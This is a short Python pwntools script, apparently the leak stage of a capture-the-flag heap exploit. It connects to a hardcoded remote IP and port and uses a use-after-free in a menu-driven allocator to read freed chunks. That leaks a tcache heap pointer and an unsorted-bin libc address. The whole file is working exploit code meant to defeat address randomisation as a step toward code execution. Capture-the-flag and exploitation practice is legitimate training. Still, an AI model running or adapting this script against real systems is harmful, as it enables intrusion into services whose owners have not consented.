#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 37415


def menu(io, c):
    io.sendlineafter(b"> ", str(c).encode())


def create(io, idx, size, data):
    menu(io, 1)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Data: ", data)


def readn(io, idx, n):
    menu(io, 2)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Data: ")
    return io.recvn(n)


def delete(io, idx):
    menu(io, 4)
    io.sendlineafter(b"Index: ", str(idx).encode())


io = remote(HOST, PORT, timeout=8)

create(io, 0, 0x80, b"A" * 0x80)
create(io, 1, 0x500, b"B" * 0x500)
create(io, 2, 0x20, b"C" * 0x20)

delete(io, 0)
raw0 = readn(io, 0, 0x80)
print("tcache raw", raw0[:16].hex())
heap_l = u64(raw0[:8])
print("heap>>12 or fd", hex(heap_l))

delete(io, 1)
raw1 = readn(io, 1, 0x20)
print("unsorted raw", raw1[:16].hex())
print("libc leak", hex(u64(raw1[:8])))
io.close()
